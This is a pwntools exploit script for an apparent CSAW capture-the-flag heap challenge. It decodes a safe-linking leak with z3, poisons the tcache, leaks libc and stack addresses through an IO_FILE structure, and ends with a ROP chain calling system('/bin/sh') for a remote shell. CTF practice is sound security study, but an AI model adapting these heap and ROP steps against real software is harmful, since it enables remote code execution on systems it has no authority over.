# Author: n132 (xm2146@nyu.edu)
# There is a certain chance of failure, too lazy to write a perfect exp 
# ----------------------------------------------------------------------
# You don't have to use z3 to compute the original val of leaked address. 
# I did use math to compute that but I chose to show the z3 solution cuz
# math solution hurt my brian. I wrote this challenge to show an useless 
# skill: decode *any* leaked safelinking value only if we know the some 
# relative values -> (page_offset & last 12bits of the value) :)  --n132
# There is a general solver for leaked safelinking value:
#           https://github.com/n132/Dec-Safe-Linking/tree/main
# ----------------------------------------------------------------------

from pwn import *
from z3 import *
T = 0x2
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = remote("pwn.chal.csaw.io",9999)
# p= process("./unsafe-linking",env={"LD_PRELOAD":"./libc.so.6"})
# p=remote("0.0.0.0",9999)
sla 	= lambda a,b: 	p.sendlineafter(a,b,timeout=T)
sa 	    = lambda a,b: 	p.sendafter(a,b,timeout=T)
# gdb.attach(p)
def cmd(c):
    sla("> ",str(c).encode())
def add(idx,size,sec = 0, c=b""):
    cmd(1)
    sla(")\n",str(sec).encode())
    sla("?\n",str(idx).encode())
    if(sec==0):
        sla("?\n",str(size).encode())
    sla(":\n",c)
def free(idx):
    cmd(2)
    sla("?\n",str(idx).encode())
def show(idx):
    cmd(3)
    sla("?\n",str(idx).encode())
def tcache(idx,val,ct=1):
    t1 = [0]*0x80
    t1[idx*2] = ct
    p1= b''
    for x in range(0x80):
        p1+=p8(t1[x])
    p2 = [0]*0x40
    p2[idx] = val
    p2 = flat(p2)
    return p1+p2
def sol(leaked,off,orecal):
    # log.warning(hex(leaked))
    # log.warning(hex(off))
    # log.warning(hex(orecal))
    leaked = BitVecVal(leaked, 48)
    orecal = BitVecVal(orecal, 48)
    off  = BitVecVal(off,48)

    page_addr = BitVec('page_addr', 48)
    res = BitVec('res', 48)
    rnd = BitVec('rnd', 48)

    s = Solver()

    s.add(((page_addr^res)^rnd)==leaked)
    s.add(page_addr == (res>>12))
    s.add(((page_addr^res)>>12)+off==rnd)

    s.add((page_addr>>36) == 0)
    s.add((rnd>>36) == 0)

    s.add(orecal == (res<<36)>>36)

    if str(s.check()) == 'sat':
        m = s.model()
        # print(m)
        return  m.evaluate(res).as_long()
    else:
        print(s.check())
        exit(1)

# Leak heap base
add(0,0x18)
add(1,0x18)
free(0)
free(1)

add(2,0x28)
add(3,0x18,1)
show(3)

p.readuntil("Secret ")
heap    = int(p.readuntil("(")[:-1],16)
p.readuntil("off= ")
off     = int(p.readuntil(")")[:-1],16)
heap    = sol(heap,off,0x4b0) - 0x14b0
log.warning("HEAP BASE: "+hex(heap))

# IO_FILE LEAK 
# Attack IO_FILE on heap
add(0,0x18)
add(1,0x18)

add(2,0x418)

free(0)
free(1)
add(3,0x28)
add(4,0x18,0,p64(heap+0x10))
free(0)
add(0,0x288,0,tcache(12,heap+0x2a0))
free(2)
# 
# context.log_level='debug'
target = 0x15c0+heap
add(1,0xd8,0,flat([0x1802,target,target+8,target+8,target,target+8,target+8]))


base = u64(p.readuntil(b'\xff')[:-1],timeout=T)-0x219ce0
log.warning("LIBC BASE: "+hex(base))
free(1)

target = 0x221200+base
add(1,0x1d8,0,flat([0x1802,target,target+8,target+8,target,target+8,target+8]))
# context.log_level='debug'

# p.interactive()
stack = u64(p.readuntil(b'\xff',timeout=T)[:-1])
log.warning("STACK ADD: "+hex(stack))

free(1)                                 # One more 0x18
free(0)                                 # tcache table 
add(0,0x288,0,tcache(63,stack-0x308))   # Points to stack buf, allocate a chunk as large as possible

# ROP 
ret     = 0x29cd6  +base
rdi     = 0x2a3e5  +base
binsh   = 0x1d8698 +base
system  = 0x50d60  +base
# gdb.attach(p,'')
add(1,0x408,0,b'\xff'*0x141+p64(ret)*0x21+flat([rdi,binsh,system]))

p.interactive()
